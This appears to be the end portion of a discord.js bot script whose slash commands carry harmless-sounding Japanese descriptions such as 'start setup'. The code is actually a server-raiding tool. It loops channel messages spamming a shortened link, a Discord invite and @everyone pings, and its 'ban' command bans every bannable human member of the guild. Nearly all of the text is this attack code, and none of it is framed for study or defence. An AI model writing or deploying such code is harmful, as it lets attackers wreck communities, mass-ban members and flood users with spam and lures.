https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);ch.send(`https://media.discordapp.net/attachments/827417203116736543/898488098479038474/makesweet-zmjeli_1.gif
https://media.discordapp.net/attachments/818954182869516289/1013743102726508564/1661761879810.jpg
https://media.discordapp.net/attachments/827417203116736543/881391737329815602/1629512134335.jpg
https://media.discordapp.net/attachments/888000765090758708/1008978746616852550/TIRARU_Falscher_because_the_creation_time_is_over_4_hours_30_timer_measured.gif
https://bit.ly/2ZFzDrB
https://discord.gg/ctkp
@everyone`);
      }).catch((err) => { console.log(err); });
    }, 100)
    setTimeout(function(){clearInterval(qwer)},6000)
    console.log(ch)
  }
    if (interaction.commandName === 'ban') {
        await interaction.deferReply();
        for(const d of JSON.parse(JSON.stringify(interaction.guild)).members){
            
            	var p = await interaction.guild.members.fetch(d)
                if(!p.bot){
                	console.log(p)
			if(p.bannable){
		 	 	p.ban()
				}
               		}
		}
        interaction.editReply("BANしました")
		interaction.editReply("実装中の機能です。")
    }
});


client.login(process.env.token)

client.on('ready', async () => {
  const data = [{
    name: "setup",
    description: "セットアップを開始します",
  },{
      name:"ban",
	  description: "BANします",
  }];
  await client.application.commands.set(data);
  console.log("Ready!");
  console.log(`Logged in as ${client.user.tag}!`);
});
